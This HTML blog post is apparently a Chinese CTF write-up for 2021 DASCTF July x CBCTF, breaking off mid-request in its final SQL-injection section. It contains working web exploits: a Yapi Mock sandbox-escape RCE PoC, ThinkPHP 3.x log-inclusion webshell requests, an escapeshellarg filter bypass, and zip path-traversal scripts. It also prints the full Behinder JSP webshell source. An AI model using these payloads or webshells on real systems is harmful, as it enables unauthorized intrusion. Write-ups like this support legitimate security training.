<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2021DASCTF July X CBCTF 4th | At的小站</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="CRYPTOYusa的密码学签到——BlockTrick12345678┌──(kali㉿kali)-[~&#x2F;桌面]└─$ nc node4.buuoj.cn 25870">
<meta property="og:type" content="article">
<meta property="og:title" content="2021DASCTF July X CBCTF 4th">
<meta property="og:url" content="https://swhat.github.io/2021/08/09/2021DASCTF-July-X-CBCTF-4th/index.html">
<meta property="og:site_name" content="At的小站">
<meta property="og:description" content="CRYPTOYusa的密码学签到——BlockTrick12345678┌──(kali㉿kali)-[~&#x2F;桌面]└─$ nc node4.buuoj.cn 25870">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/121016-717857.png">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122132-465323.png">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122242-47584.png">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122323-509098.png">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122333-324537.png">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122350-188687.png">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122426-607150.png">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122440-299502.png">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122452-433384.png">
<meta property="og:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122503-379175.png">
<meta property="article:published_time" content="2021-08-09T14:26:42.000Z">
<meta property="article:modified_time" content="2021-08-15T04:25:06.765Z">
<meta property="article:author" content="Atkx">
<meta property="article:tag" content="Write up">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/121016-717857.png">
  
    <link rel="alternative" href="/atom.xml" title="At的小站" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/atkx_16x16.png">
  
  
      
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: false,
          isPost: true,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
<meta name="generator" content="Hexo 5.3.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            
            <img lazy-src="/img/atkx.png" class="js-avatar">
            
        </a>

        <hgroup>
          <h1 class="header-author"><a href="/" title="Hi Mate"></a></h1>
        </hgroup>

        
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/Home">博客首页</a></li>
                        
                            <li><a href="/works">作品展示</a></li>
                        
                            <li><a href="/about">留言打卡</a></li>
                        
                            <li><a href="/FrontEndGuide">前端导航</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github" target="_blank" href="https://github.com/swhat" title="github">github</a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <a href="/tags/AWD/" style="font-size: 10px;">AWD</a> <a href="/tags/CTFhub/" style="font-size: 16px;">CTFhub</a> <a href="/tags/CTFshow/" style="font-size: 10px;">CTFshow</a> <a href="/tags/Dcoker/" style="font-size: 14px;">Dcoker</a> <a href="/tags/MISC/" style="font-size: 10px;">MISC</a> <a href="/tags/MYSQL/" style="font-size: 10px;">MYSQL</a> <a href="/tags/PHP/" style="font-size: 18px;">PHP</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/Struts2/" style="font-size: 14px;">Struts2</a> <a href="/tags/Write-up/" style="font-size: 20px;">Write up</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 12px;">信息泄露</a> <a href="/tags/%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">协议基础</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">命令执行</a> <a href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">搭建博客</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 12px;">文件上传</a> <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 12px;">流量分析</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">漏洞复现</a>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://swhat.github.io/">name</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">CTF小白</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/atkx.png" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/Home">博客首页</a></li>
                
                    <li><a href="/works">作品展示</a></li>
                
                    <li><a href="/about">留言打卡</a></li>
                
                    <li><a href="/FrontEndGuide">前端导航</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="https://github.com/swhat" title="github">github</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap"><article id="post-2021DASCTF-July-X-CBCTF-4th" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/08/09/2021DASCTF-July-X-CBCTF-4th/" class="article-date">
      <time datetime="2021-08-09T14:26:42.000Z" itemprop="datePublished">2021-08-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2021DASCTF July X CBCTF 4th
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/CTF/">CTF</a><a class="article-category-link" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Write-up/" rel="tag">Write up</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc node<span class="hljs-number">4</span>.buuoj.cn <span class="hljs-number">25870</span>                                                                                                                                                      <span class="hljs-number">1</span> ⨯<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>Try again<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>flag&#123;<span class="hljs-number">30</span>cf<span class="hljs-number">1012</span>-e<span class="hljs-number">303</span><span class="hljs-number">-4</span>caf<span class="hljs-number">-98</span>ba-d<span class="hljs-number">63</span>f<span class="hljs-number">3591e9</span>cd&#125;<br></code></pre></td></tr></table></figure>


<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><h4 id="Yapi-Mock-远程命令执行漏洞"><a href="#Yapi-Mock-远程命令执行漏洞" class="headerlink" title="Yapi Mock 远程命令执行漏洞"></a>Yapi Mock 远程命令执行漏洞</h4><p>添加项目—&gt;添加接口—&gt;选择高级Mock—&gt;勾选脚本—&gt;将开启按钮打开—&gt;然后将PoC写在脚本中保存</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">const</span> sandbox = <span class="hljs-keyword">this</span><br><span class="hljs-keyword">const</span> ObjectConstructor = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> FunctionConstructor = ObjectConstructor.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> myfun = FunctionConstructor(<span class="hljs-string">&#x27;return process&#x27;</span>)<br><span class="hljs-keyword">const</span> process = myfun()<br>mockJson = process.mainModule.require(<span class="hljs-string">&quot;child_process&quot;</span>).execSync(<span class="hljs-string">&quot;ls /&amp; cat /ffffffflllllaggggg&quot;</span>).toString()<br></code></pre></td></tr></table></figure>
<p>访问预览地址，回显命令执行结果getflag</p>
<h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h2><h4 id="非ascii字符绕过escapeshellarg"><a href="#非ascii字符绕过escapeshellarg" class="headerlink" title="非ascii字符绕过escapeshellarg"></a>非ascii字符绕过escapeshellarg</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))<br>    &#123;<br>        <span class="hljs-variable">$cmd</span> = escapeshellarg(<span class="hljs-variable">$cmd</span>);<br>        system(<span class="hljs-string">&#x27;cat &#x27;</span> . <span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>hint提示管理员曾访问过flag，查看日志</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?cmd=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure>
<p>得到flag文件为/this_is_final_flag_e2a457126032b42d.php</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">?cmd=<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_f</span>inal<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span>e<span class="hljs-number">2</span>a<span class="hljs-number">457126032</span>b<span class="hljs-number">42</span>d.php<br></code></pre></td></tr></table></figure>
<p>过滤了flag关键字，配合escapeshellarg函数绕过：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.escapeshellarg.php">https://www.php.net/manual/zh/function.escapeshellarg.php</a></p>
<p>当escapeshellarg（）从UTF-8字符串中剥离非ASCII字符时，添加以下内容修复了该问题：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;?php<br>setlocale(LC_CTYPE, <span class="hljs-string">&quot;en_US.UTF-8&quot;</span>);<br>?&gt;<br>  <br> Under Windows, this function puts <span class="hljs-built_in">string</span> <span class="hljs-keyword">into</span> double-quotes, <span class="hljs-keyword">not</span> single, <span class="hljs-keyword">and</span> replaces %(percent sign) <span class="hljs-keyword">with</span> a <span class="hljs-literal">space</span>, <span class="hljs-keyword">that</span>&#x27;s why <span class="hljs-keyword">it</span>&#x27;s impossible <span class="hljs-keyword">to</span> pass a filename <span class="hljs-keyword">with</span> percents <span class="hljs-keyword">in</span> <span class="hljs-keyword">its</span> <span class="hljs-built_in">name</span> <span class="hljs-keyword">through</span> this function.<br> <br>在Windows下，此函数将字符串放在双引号中，而不是单引号中，并用空格替换%（百分号），这就是为什么无法通过此函数传递名称中带有百分数的文件名的原因。<br></code></pre></td></tr></table></figure>
<p>在flag字符之间添加一个非ascii字符，然后unicode绕一下flag正则</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">?cmd=this_is_final_fl%faag_e2a457126032b42d.php</span><br><span class="xml"> #</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;flag&#123;cb3043a6-bfe6-4c6d-a75e-fc77e27de779&#125;&#x27;</span>; <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>






<h2 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h2><h4 id="ThinkPHP-3-x-日志包含RCE-getshell"><a href="#ThinkPHP-3-x-日志包含RCE-getshell" class="headerlink" title="ThinkPHP 3.x 日志包含RCE getshell"></a>ThinkPHP 3.x 日志包含RCE getshell</h4><p>TP3.2.3日志漏洞:<a target="_blank" rel="noopener" href="https://www.thinkphp.cn/topic/58651.html">https://www.thinkphp.cn/topic/58651.html</a></p>
<p>ThinkPHP3.2.x RCE漏洞通报：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1855060">https://cloud.tencent.com/developer/article/1855060</a></p>
<p>通过输入http://域名/应用名（默认为Application，很多开发者不会改它）/Runtime/Logs/组名（默认为Home或者Index，很多开发者不会改它）/18_08_15.log的方式即可访问日志文件</p>
<p>POC</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">写入phpinfo()<br>GET <span class="hljs-regexp">/index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/</span><span class="hljs-number">1.1</span><br>Host: c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90.0</span><br>Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>webp,*/*;q=<span class="hljs-number">0.8</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.8</span>,zh-TW;q=<span class="hljs-number">0.7</span>,zh-HK;q=<span class="hljs-number">0.5</span>,en-US;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: PHPSESSID=<span class="hljs-number">3</span>nctjnqfd39jl28bg59mnaf2b5<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br><br>  <br>查看日志，注意日志时间<br>GET <span class="hljs-regexp">/index.php/</span>?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=.<span class="hljs-regexp">/Application/</span>Runtime<span class="hljs-regexp">/Logs/</span>Common/<span class="hljs-number">21</span>_08_02.log<br><br>上shell<br>GET /index.php?m=--&gt;&lt;?=@eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;atkx&quot;</span>]);?&gt;<br><br>蚁剑连接：<br>http:<span class="hljs-regexp">//</span>c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<span class="hljs-regexp">/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Common/</span><span class="hljs-number">21</span>_08_02.log<br>pass：atkx<br></code></pre></td></tr></table></figure>
<p>蚁剑连接成功</p>
<p>ThinkphpGUI工具getshell</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/121016-717857.png" alt="image-20210815121015293"></p>
<p>相关信息;</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">检测漏洞 ThinkPHP <span class="hljs-number">3</span>.x Log RCE中......<br>[+] 存在ThinkPHP <span class="hljs-number">3</span>.x Log RCE<br>Payload: http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log<br>[+] http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log   Pass:peiqi<br></code></pre></td></tr></table></figure>


<p>蚁剑连接成功</p>
<h2 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h2><h4 id="jspxcms解压getshell漏洞"><a href="#jspxcms解压getshell漏洞" class="headerlink" title="jspxcms解压getshell漏洞"></a>jspxcms解压getshell漏洞</h4><p><a target="_blank" rel="noopener" href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/</a></p>
<p>admin空密码登录后台，进入后台管理页面：/cmscp/index.do找到漏洞存在的功能页面。</p>
<p>这里用冰蝎自带的马shell.jsp</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;%@page import=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> U extends ClassLoader&#123;<span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span>&#123;super(c);&#125;public Class g(byte <span class="hljs-literal">[]</span>b)&#123;return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>,0,<span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">Method()</span>.equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-params">k</span>)</span>;Cipher c=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Cipher</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;AES&quot;</span>)</span>;c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-constructor">SecretKeySpec(<span class="hljs-params">k</span>.<span class="hljs-params">getBytes</span>()</span>,<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(c.<span class="hljs-keyword">do</span><span class="hljs-constructor">Final(<span class="hljs-params">new</span> <span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.BASE64Decoder()</span>.decode<span class="hljs-constructor">Buffer(<span class="hljs-params">request</span>.<span class="hljs-params">getReader</span>()</span>.read<span class="hljs-constructor">Line()</span>))).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
<p>生成war，把shell.jsp和jar.exe放至同一目录下</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>cf <span class="hljs-keyword">shell.war </span>*<br></code></pre></td></tr></table></figure>
<p>所以选择脚本写入</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import zipfile<br><br>z = zipfile.ZipFile(<span class="hljs-string">&#x27;test.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shell.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    temp=f.<span class="hljs-built_in">read</span>()<br><br>z.writestr(<span class="hljs-string">&#x27;../../../shell.war&#x27;</span>,temp)  <span class="hljs-comment">#shell.war为上一步生产的后门war包</span><br>z.<span class="hljs-built_in">close</span>()<br>    <br>      <br>      <br>import zipfile<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cmd.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>binary=f.<span class="hljs-built_in">read</span>()<br>f.<span class="hljs-built_in">close</span>()<br>binary1 = b<span class="hljs-string">&#x27;123123&#x27;</span><br>zipFile = zipfile.ZipFile(<span class="hljs-string">&quot;tests.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)<br>info = zipfile.ZipInfo(<span class="hljs-string">&quot;tests.zip&quot;</span>)<br>zipFile.writestr(<span class="hljs-string">&quot;../../../shells.war&quot;</span>, binary)<br>zipFile.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure>
<p>上传生成的test.zip</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122132-465323.png" alt="image-20210815122131241"></p>
<p>注意解压，然后冰蝎连接</p>
<p><a target="_blank" rel="noopener" href="http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/cmscp/index.do">http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/</a>shell/shell.jsp</p>
<p>pass：rebeyond</p>
<h2 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h2><h4 id="Beescms-v4-0-sql注入漏洞分析"><a href="#Beescms-v4-0-sql注入漏洞分析" class="headerlink" title="Beescms_v4.0 sql注入漏洞分析"></a>Beescms_v4.0 sql注入漏洞分析</h4><p>后台注入outfile :<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a></p>
<p>/<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载源码是beescms，/var/www/html/</p>
<p>sql注入outfile写webshell，过滤了空格，用然/**/代替，后连接webshell</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /admin/login.php?action=ck_login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">90</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90</span>.<span 